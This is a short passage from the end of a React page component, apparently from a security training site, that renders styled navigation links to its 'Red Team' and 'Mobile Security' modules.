          <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-11: RED TEAM</Link>
          <Link href="/modules/mobile-security" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-13: MOBILE SECURITY &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
